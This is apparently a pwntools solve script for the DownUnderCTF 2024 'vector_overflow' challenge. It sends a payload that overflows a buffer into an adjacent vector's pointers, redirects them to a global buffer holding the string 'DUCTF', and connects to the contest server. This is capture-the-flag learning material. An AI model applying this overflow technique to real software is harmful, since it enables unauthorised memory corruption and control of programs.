#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vector_overflow' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '2024.ductf.dev', 30013 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    # buf fill with DUCTF then overflow the first address in vector to point to buf, then the rest to + 5 to indicate size (?)
    payload = b'DUCTF\x00\x00\x00'
    payload += b'\x00' * 8
    payload += p64(elf.sym['buf'])
    payload += p64(elf.sym['buf'] + 5)
    payload += p64(elf.sym['buf'] + 5)
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()